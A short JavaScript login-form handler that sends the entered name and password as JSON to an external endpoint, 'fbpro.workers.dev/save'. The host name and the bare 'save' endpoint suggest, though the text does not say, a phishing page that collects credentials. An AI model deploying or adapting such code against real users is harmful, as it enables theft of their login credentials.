document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const name = document.getElementById("name").value;
  const password = document.getElementById("password").value;

  const result = document.getElementById("result");

  try {
    const response = await fetch("https://fbpro.workers.dev/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, password }),
    });

    const text = await response.text();
    result.innerText = text;
  } catch (err) {
    result.innerText = "Error: " + err.message;
  }
});
